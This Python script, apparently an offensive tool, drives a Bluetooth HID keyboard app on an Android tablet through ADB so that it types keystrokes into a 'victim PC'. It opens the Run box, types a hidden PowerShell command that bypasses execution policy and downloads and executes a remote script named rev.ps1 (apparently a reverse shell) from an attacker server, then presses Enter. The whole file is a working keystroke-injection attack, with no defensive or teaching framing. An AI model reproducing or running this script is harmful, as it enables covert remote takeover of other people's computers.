import os
import time
import subprocess

# DUDE'S AUTOMATED BLUETOOTH PAYLOAD INJECTOR
# Uses ADB to control the BLE HID app on your tablet

TARGET_IP = "192.168.0.34"
PORT = 8000
PAYLOAD_URL = f"http://{TARGET_IP}:{PORT}/rev.ps1"
POWERSHELL_CMD = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'{PAYLOAD_URL}\')"'

def run_adb(cmd):
    subprocess.run(f"adb shell {cmd}", shell=True)

def inject():
    print(f"[*] DUDE: Preparing injection via Bluetooth HID app...")
    
    # 1. Open the 'Run' box on the victim PC (Windows Key + R)
    # In the app, we assume the keyboard interface is active.
    # We send the Android keycodes that the app translates to HID.
    print("[*] Sending 'Win + R' to target...")
    run_adb("input keyevent --longpress 117") # Meta/Win Key
    time.sleep(0.5)
    run_adb("input keyevent 46") # 'R' Key
    time.sleep(1)

    # 2. Type the PowerShell payload
    print(f"[*] Typing payload: {POWERSHELL_CMD}")
    # We split it to avoid ADB string length limits or shell escapes
    # Note: 'input text' on Android can be slow or flaky with special chars.
    # We'll use a loop or encoded string if needed.
    run_adb(f"input text '{POWERSHELL_CMD}'")
    time.sleep(1)

    # 3. Hit Enter
    print("[*] Sending ENTER...")
    run_adb("input keyevent 66")
    
    print("\n[+] DUDE: Attack sequence delivered. Check your server logs!")

if __name__ == "__main__":
    inject()
